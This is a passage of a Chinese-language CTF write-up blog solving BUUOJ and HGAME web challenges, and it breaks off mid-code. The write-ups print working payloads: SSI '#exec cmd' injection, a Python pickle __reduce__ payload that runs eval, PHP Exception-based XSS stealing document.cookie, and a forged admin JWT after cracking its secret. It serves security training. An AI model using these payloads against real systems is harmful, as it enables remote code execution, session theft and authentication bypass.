punctuation">)</span><span class="token punctuation">;</span><span class="token operator">**</span><span class="token operator">*</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">''</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'6d0bc1'</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$admin</span> <span class="token operator">==</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('[+] Welcome to manage system')&lt;/script>"</span><span class="token punctuation">;</span>            <span class="token variable">$file_shtml</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"public/"</span><span class="token operator">.</span><span class="token function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".shtml"</span><span class="token punctuation">;</span>            <span class="token variable">$shtml</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$file_shtml</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Unable to open file!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'            ***            ***            &lt;h1>Hello,'</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/h1>            ******'</span><span class="token punctuation">;</span>            <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">,</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">**</span><span class="token operator">*</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"[!] Header  error ..."</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('[!] Failed')&lt;/script>"</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span><span class="token keyword">else</span>    <span class="token punctuation">&#123;</span><span class="token operator">**</span><span class="token operator">*</span>    <span class="token punctuation">&#125;</span><span class="token operator">**</span><span class="token operator">*</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>password的md5值的前6位是6d0bc1,写个脚本爆破一下密码。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">99999999</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">==</span><span class="token string double-quoted-string">"6d0bc1"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$i</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$code</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>爆破出密码为2020666，登陆后会生成一个shtml文件，什么是shtml文件呢。</p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>shtml是标准通用标记语言下的一个应用，包含有嵌入式服务器方包含命令的文本，在被传送给浏览器之前，服务器会对SHTML文档进行完全地读取、分析以及修改。</p><p>有叫做服务器端包含，Server side include。</p><p>1．显示服务器端环境变量&lt;#echo&gt;</p><p>2．将文本内容直接插入到文档中&lt;#include&gt;</p><p>3．显示WEB文档相关信息&lt;#flastmod #fsize&gt; (如文件制作日期/大小等)</p><p>4．直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)</p><p>5．设置SSI信息显示格式&lt;#config&gt;(如文件制作日期/大小显示方式) 高级SSI<XSSI>可设置变量使用if条件语句。</p></blockquote><p>所以我们可以利用username处来传入代码，进行代码注入，从而执行命令或读取文件。</p><pre class="line-numbers language-shtml" data-language="shtml"><code class="language-shtml">&lt;! #include virtual&#x3D;&quot;&#x2F;etc&#x2F;passwd&quot;–&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现被过滤了，换一个命令执行看看。</p><pre class="line-numbers language-shtml" data-language="shtml"><code class="language-shtml">&lt;! #exec cmd&#x3D;&quot;ls&quot;--&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行成功，得到当前目录下的文件</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210201213857356.png" alt="image-20210201213857356"></p><p>修改命令问<code>ls /</code>，发现根目录下没有flag，那就看看webroot吧</p><p>发现了flag相关信息。</p><pre class="line-numbers language-shtml" data-language="shtml"><code class="language-shtml">username&#x3D;&lt;!--#exec cmd&#x3D;&quot;cat &#x2F;var&#x2F;www&#x2F;html&#x2F;flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;&amp;password&#x3D;2020666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210201214351234.png" alt="image-20210201214351234"></p><p>得到flag。</p><p>相关知识：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="BJDCTF-2nd-xss之光"><a href="#BJDCTF-2nd-xss之光" class="headerlink" title="[BJDCTF 2nd]xss之光"></a>[BJDCTF 2nd]xss之光</h2><p>考点：git泄露</p><p>进去什么都没有，只能使用dirsearch目录扫描，从而发现存在git泄露，使用githack抓取git目录。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210202141800106.png" alt="image-20210202141800106"></p><p>index.php:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'yds_is_so_beautiful'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>反序列化问题，但是没有类信息啊。后来看了WP，提供了一中思路，再这种情况下可以考虑使用内置类。随便试试看吧，经过测试我们序列化的字符串会被反序列化然后嵌入网页。从常规的反序列化角度来看，echo一个对象，这是会触发<code>_toString</code>方法的。所以最好是找个有<code>_toString</code>的类，一般常用的内置类是Error类和Exception类。Error类是只适用与php7，而Exception类适用与php5和php7。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;script>alert(document.cookie)&lt;/script>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># $a = '&lt;script>alert(document.cookie)&lt;/script>';</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210202152427719.png" alt="image-20210202152427719"></p><p>没有发现flag。换一个window.location.href=’<a href="http://www.baidu.com&/#39;">http://www.baidu.com&#39;</a></p><p>使用网页跳转的script脚本，就成功获得了flag。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210202154503089.png" alt="image-20210202154503089"></p><h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p>考点：pickle反序列化、jwt伪造cookie</p><p>先看看首页源码，看看都有哪些路由，<code>/,/login,/register</code>等</p><p>并且题目说脑洞大，给了一些hint，ikun们冲鸭,一定要买到lv6!!!</p><p>点击下一页就会传入page不断++，而且page很大到了100都还存在，lv主要是体现在商品图片的名称，图片是什么对应的名称也是什么。那么写个脚本遍历一个page看看，lv6在哪里。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">find_lv6</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">"http://ca08947c-1d43-4954-9ea1-32d3f5b99dea.node3.buuoj.cn/shop?page="</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> r<span class="token punctuation">.</span>apparent_encoding        <span class="token keyword">if</span> <span class="token string">"lv6.png"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    find_lv6<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>爆破出page=181时出现lv6，可惜我们只有10快钱，买不起啊。抓包看看，修改price没有成功，发现一个有趣的参数discount也就是折扣，默认是8折，修改它试试。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210203210100437.png" alt="image-20210203210100437"></p><p>成功购买到了lv6，是一个重定向到路由/b1g_m4mber</p><p>访问一下，发现页面子允许admin访问。可以发现cookie里面又jwt，去jwt.io网站看看能不能伪造cookie，绕过身份认证。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210203210154447.png" alt="image-20210203210154447"></p><p>首先使用jwtcrack去进行爆破密钥，得到密码是1Kun</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210203212349190.png" alt="image-20210203212349190"></p><p>然后jwt.io网站伪造cookie。</p><pre class="line-numbers language-jwt" data-language="jwt"><code class="language-jwt">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问成功。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210203221553232.png" alt="image-20210203221553232"></p><p>查看前端源码</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210203221702676.png" alt="image-20210203221702676"></p><p>发现了源码文件，全局搜索pickle，在admin.py文件中看到了一个pickle.loads()的反序列化</p><p><img src="C:\Users\lilon\AppData\Roaming\Typora\typora-user-images\image-20210203230153961.png" alt="image-20210203230153961"></p><p>在刚才的一键成为大会员处，就存在一个Post传入become参数的点，应该就是存在反序列化的点：</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210203230424033.png" alt="image-20210203230424033"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> urllib<span class="token keyword">class</span> <span class="token class-name">Payload</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"open('/flag.txt', 'r').read()"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>Payload<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意一点，我们通过查看源码，可以判断出程序是基于python2的，由于python3和python2的不兼容，序列化后的结果也是不同的，所以应该使用python2来执行脚本生成payload。</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27&#x2F;flag.txt%27%2C%20%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改become为我们的payload：</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210204000829671.png" alt="image-20210204000829671"></p><h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p>考点：</p><p>通过报错信息，我们可以看到部分程序源码，源码路径是/app/app.py：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/decode'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>        text <span class="token operator">=</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"text"</span><span class="token punctuation">)</span>        text_decode <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        tmp <span class="token operator">=</span> <span class="token string">"结果 ： &#123;0&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>text_decode<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> waf<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span> <span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">"no no no !!"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'decode'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        res <span class="token operator">=</span>  render_template_string<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>        flash<span class="token punctuation">(</span> res <span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'decode'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token keyword">else</span> <span class="token punctuation">:</span>        text <span class="token operator">=</span> <span class="token string">""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;BJDCTF2020-EasySearch&quot;&gt;&lt;a href=&quot;#BJDCTF2020-EasySearch&quot; class=&quot;headerlink&quot; title=&quot;[BJDCTF2020]EasySearch&quot;&gt;&lt;/a&gt;[BJDCTF2020]EasySearch</summary>
      
    
    
    
    <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
    <category term="BUUOJ" scheme="http://yoursite.com/tags/BUUOJ/"/>
    
  </entry>
  
  <entry>
    <title>HGAME2021部分</title>
    <link href="http://yoursite.com/post/HGAME2021.html"/>
    <id>http://yoursite.com/post/HGAME2021.html</id>
    <published>2021-01-31T13:25:26.000Z</published>
    <updated>2021-03-29T08:46:31.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Hitchhiking-in-the-Galaxy"><a href="#Hitchhiking-in-the-Galaxy" class="headerlink" title="Hitchhiking_in_the_Galaxy"></a>Hitchhiking_in_the_Galaxy</h3><p>考点：HTTP头部信息</p><p>访问HitchhikerGuide.php，修改访问模式为POST，修改UA为Infinite Improbability Drive，修改Referer为<a href="https://cardinal.ink/%EF%BC%8C%E5%86%8D%E8%AE%BE%E7%BD%AExxf%E4%B8%BA127.0.0.1">https://cardinal.ink/，再设置xxf为127.0.0.1</a></p><p>​    hgame{s3Cret_0f_HitCHhiking_in_the_GAl@xy_i5_dOnT_p@nic!}</p><h3 id="智商检测鸡"><a href="#智商检测鸡" class="headerlink" title="智商检测鸡"></a>智商检测鸡</h3><p>考点：脚本编写</p><p>首先查看js脚本，发现几个路由的存在/api/getQuestion，/api/verify，/api/getFlag，/api/status</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        type<span class="token operator">:</span><span class="token string">"GET"</span><span class="token punctuation">,</span>        url<span class="token operator">:</span> <span class="token string">"/api/getStatus"</span><span class="token punctuation">,</span>        dataType<span class="token operator">:</span><span class="token string">"json"</span><span class="token punctuation">,</span>        <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> solving <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'solving'</span><span class="token punctuation">]</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#status"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>solving<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>solving <span class="token operator">===</span> <span class="token number">100</span><span class="token punctuation">)</span>                <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">getQuestion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        type<span class="token operator">:</span> <span class="token string">"GET"</span><span class="token punctuation">,</span>        url<span class="token operator">:</span> <span class="token string">"/api/getQuestion"</span><span class="token punctuation">,</span>        dataType<span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span>        xhrFields<span class="token operator">:</span> <span class="token punctuation">&#123;</span>            withCredentials<span class="token operator">:</span> <span class="token boolean">true</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        crossDomain<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#integral'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'question'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        type<span class="token operator">:</span> <span class="token string">"GET"</span><span class="token punctuation">,</span>        url<span class="token operator">:</span> <span class="token string">"/api/getFlag"</span><span class="token punctuation">,</span>        dataType<span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span>        <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">getQuestion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    type<span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>    url<span class="token operator">:</span> <span class="token string">"/api/verify"</span><span class="token punctuation">,</span>    data<span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>answer<span class="token operator">:</span><span class="token function">parseFloat</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#answer'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    dataType<span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span>    contentType<span class="token operator">:</span> <span class="token string">"application/json;charset=utf-8"</span><span class="token punctuation">,</span>    xhrFields<span class="token operator">:</span> <span class="token punctuation">&#123;</span>        withCredentials<span class="token operator">:</span> <span class="token boolean">true</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    crossDomain<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'result'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#alert'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token 